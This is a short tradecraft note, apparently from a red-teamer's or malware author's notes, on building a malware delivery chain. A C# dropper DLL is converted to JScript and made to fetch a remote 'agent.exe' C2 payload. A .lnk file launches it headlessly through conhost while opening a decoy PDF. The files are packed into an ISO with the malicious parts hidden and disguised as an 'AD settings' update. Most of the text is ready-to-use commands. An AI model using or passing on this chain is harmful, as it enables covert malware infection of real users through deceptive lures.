# Dropper (C#, .NET)

- C# dropper Gets compiled into .DLL

Using DotNetToJScript(.exe) to convert it to Javascript:
```
# Where "MainFunction" is the Main Public Class name; the entry Point
.\DotNetToJScript.exe 'C:\\test.dll' -l JScript -v v4 -c MainFunction -o cradle_deb.js
```

Modifying our resulting JS file, we need to hardcode an argumnent for `InvokeMain()`:

`o.InvokeMain("<URL>/agent.exe");` 

Where "`o`" is the instance of the main class of the DLL ("o" is arbitrarily generated by `DotNetToJScript` as it can be seen on the resulting Javascript file), we just need to append this line at the end so our `invokeMain()` function can be called.

# Execution

Having 3 files (A .lnk, the JS file and a PDF),

.lnk file:
```
%WINDIR%\System32\Conhost.exe --headless conhost conhost conhost conhost conhost "%COMSPEC%" "/c wscript config.js | file.pdf"
```

Hide/Pack our JS, PDF and .LNK files into an ISO:

```powershell
# ARG 1: Absolute path to folder with files to "pack" (Without trailing "\" at the end)
# ARG 2: Out file (ISO)
# ARG 3: Files to "hide" (There are 3 files in WORKING_AREA. Of those, only the ones in --hide will be hidden)
python.exe .\PackMyPayload.py "C:\\WORKING_AREA" update_ad_settings.iso --hide Update_AD_Settings.config.js,Update_AD_Settings.pdf
```

Main Notes: 
- When C2 agent ran from memory, DLL needs to pass in an empty argument (Not NULL) - Else, the program crashes (C# Lines 538 onward).
- The client machine (Which runs the JS file) needs to have .NET framework installed.
